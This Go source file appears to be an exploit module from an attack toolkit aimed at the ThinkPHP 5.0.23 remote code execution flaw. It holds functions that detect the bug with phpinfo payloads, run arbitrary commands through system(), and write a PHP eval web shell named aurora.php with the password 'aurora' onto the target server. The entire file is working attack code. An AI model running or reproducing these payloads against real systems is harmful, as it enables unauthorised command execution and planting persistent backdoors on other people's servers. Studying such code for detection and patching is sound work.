package thinkphp

import (
	"breach/internal/util"
	"io"
	"net/http"
	"net/url"
	"strings"
)

type TP5023Module struct {
	BaseUrl  string
	feature  string
	checkStr string
}

func (t *TP5023Module) CheckVul() *util.Response {
	payloadUrl := t.BaseUrl + "/?s=captcha&test=-1"
	payloads := []string{
		"_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1",
		"_method=__ConStruct&method=get&filter[]=call_user_func&get[0]=phpinfo",
		"_method=__construct&filter[]=phpinfo&method=GET&get[]=1",
	}
	client := http.Client{}
	for _, payload := range payloads {
		decodedParam, _ := url.QueryUnescape(payload)
		paramsMap, _ := url.ParseQuery(decodedParam)
		urlValues := url.Values{}
		for key, values := range paramsMap {
			for _, value := range values {
				urlValues.Add(key, value)
			}
		}
		req, err := http.NewRequest(http.MethodPost, payloadUrl, strings.NewReader(urlValues.Encode()))
		if err != nil {
			return util.Fail(err.Error())
		}
		resp, err := client.Do(req)

		if err != nil {
			return util.Fail(err.Error())
		}
		bytes, err := io.ReadAll(resp.Body)
		if err != nil {
			return util.Fail(err.Error())
		}
		if strings.Contains(string(bytes), t.checkStr) {
			return util.Success(t.feature, payloadUrl+"Post "+payload)
		}
	}
	return util.Fail("no vulnerable")
}

func (t *TP5023Module) ExecVul(cmd string) *util.Response {
	payloadUrl := t.BaseUrl + "/?s=captcha&test="
	payloads := []string{
		"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=" + cmd,
		"s=" + cmd + "&_method=__construct&method=get&filter[]=system",
		"s=" + cmd + "&_method=__construct&method&filter[]=system",
	}
	client := &http.Client{}
	for _, payload := range payloads {
		decodedParam, _ := url.QueryUnescape(payload)
		paramsMap, _ := url.ParseQuery(decodedParam)
		urlValues := url.Values{}
		for key, values := range paramsMap {
			for _, value := range values {
				urlValues.Add(key, value)
			}
		}
		req, err := http.NewRequest(http.MethodPost, payloadUrl, strings.NewReader(urlValues.Encode()))
		if err != nil {
			return util.Fail(err.Error())
		}
		resp, err := client.Do(req)
		if err != nil {
			return util.Fail(err.Error())
		}
		bytes, err := io.ReadAll(resp.Body)
		if err != nil {
			return util.Fail(err.Error())
		}
		res := string(bytes)[:strings.Index(string(bytes), "<")]
		if res == "" {
			return util.Success("success", string(bytes))
		}
		return util.Success("success", res)
	}
	return util.Fail("no vulnerable")
}

func (t *TP5023Module) GetShell() *util.Response {
	payloadUrl := t.BaseUrl + "/?s=captcha&test=-1"
	payloads := []string{
		"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?php @eval($_POST['aurora'])?>' >>aurora.php",
		"_method=__construct&filter[]=system&method=GET&get[]=echo '<?php @eval($_POST['aurora'])?>' >>aurora.php",
		"_method=__construct&filter[]=assert&method=GET&get[]=file_put_contents('./aurora.php','<?php%20@eval($_POST[%27aurora%27])?>');",
		"_method=__construct&filter[]=assert&method=GET&get[]=copy('<?php%20@eval($_POST[%27aurora%27])?>', './aurora.php');",
	}
	client := &http.Client{}
	for _, payload := range payloads {
		decodedParam, _ := url.QueryUnescape(payload)
		paramsMap, _ := url.ParseQuery(decodedParam)
		urlValues := url.Values{}
		for key, values := range paramsMap {
			for _, value := range values {
				urlValues.Add(key, value)
			}
		}
		req, err := http.NewRequest(http.MethodPost, payloadUrl, strings.NewReader(urlValues.Encode()))
		if err != nil {
			return util.Fail(err.Error())
		}
		resp, err := client.Do(req)
		if err != nil {
			return util.Fail(err.Error())
		}
		resp, err = http.Get(t.BaseUrl + "/aurora.php")
		if err != nil {
			return util.Fail(err.Error())
		}
		if resp.StatusCode == 200 {
			return util.Success("success", t.BaseUrl+"/aurora.php   Pass:aurora")
		}
	}

	return util.Fail("no vulnerable")
}

func NewTP5023Module(baseUrl string) *TP5023Module {
	return &TP5023Module{
		BaseUrl:  baseUrl,
		feature:  "ThinkPHP 5.0.23 RCE",
		checkStr: "PHP Version",
	}
}
